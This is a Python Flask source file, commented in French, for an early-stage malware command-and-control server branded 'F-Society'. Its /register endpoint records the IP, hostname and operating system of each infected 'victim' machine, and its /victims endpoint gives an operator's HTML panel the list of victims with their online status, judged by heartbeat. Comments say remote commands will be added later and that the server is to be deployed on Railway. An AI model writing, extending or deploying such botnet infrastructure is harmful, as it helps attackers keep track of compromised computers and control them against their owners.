from flask import Flask, request, jsonify
from flask_cors import CORS
from datetime import datetime
import time

app = Flask(__name__)
# IMPORTANT : Cela autorise ton site HTML et le virus à communiquer avec ce serveur
CORS(app) 

# Mémoire du serveur (liste des victimes)
victims = {}

def get_timestamp():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

@app.route('/')
def home():
    return "F-Society Server is running. Access denied for unauthorized personnel."

# 1. Le virus s'enregistre ici
@app.route('/register', methods=['POST'])
def register():
    data = request.get_json()
    ip = data.get('ip', 'Unknown IP')
    hostname = data.get('hostname', 'Unknown Hostname')
    os_info = data.get('os', 'Unknown OS')
    
    # On crée un ID unique basé sur le hostname + timestamp pour éviter les doublons malveillants
    # Mais pour simplifier, on va juste utiliser un ID incremental et vérifier l'IP/Hostname
    # Dans un vrai cas, on ferait plus complexe. Ici, on va juste ajouter ou mettre à jour.
    
    # Vérifier si cette machine existe déjà (par hostname ou IP)
    victim_id = None
    for vid, info in victims.items():
        if info['ip'] == ip or info['hostname'] == hostname:
            victim_id = vid
            break
    
    if victim_id is None:
        # Nouvelle victime
        victim_id = len(victims) + 1
        victims[victim_id] = {
            'id': victim_id,
            'ip': ip,
            'hostname': hostname,
            'os': os_info,
            'last_seen': time.time(),
            'status': 'online'
        }
        print(f"[+] Nouvelle victime connectée : ID {victim_id} - {hostname} ({ip})")
    else:
        # Mise à jour de l'existing victime
        victims[victim_id]['last_seen'] = time.time()
        victims[victim_id]['status'] = 'online'
        print(f"[*] Victime {victim_id} a fait heartbeat")

    return jsonify({'status': 'ok', 'id': victim_id})

# 2. Le panel HTML demande la liste des victimes
@app.route('/victims', methods=['GET'])
def get_victims():
    current_time = time.time()
    active_victims = []
    
    for vid, info in victims.items():
        # Si la dernière vue est récente (moins de 60 secondes), on dit online
        if current_time - info['last_seen'] < 60:
            info['status'] = 'online'
        else:
            info['status'] = 'offline'
        active_victims.append(info)
        
    # Trier pour avoir les online en premier
    active_victims.sort(key=lambda x: (x['status'] != 'online', x['id']), reverse=False)
    
    return jsonify(active_victims)

# Note : Pour l'instant, on ne fait que l'enregistrement et la liste.
# Les commandes et autres fonctionnalités avancées seront ajoutées dans une prochaine étape.

if __name__ == '__main__':
    # Pour le test local, mais Railway utilisera gunicorn via le Procfile
    app.run(host='0.0.0.0', port=5000)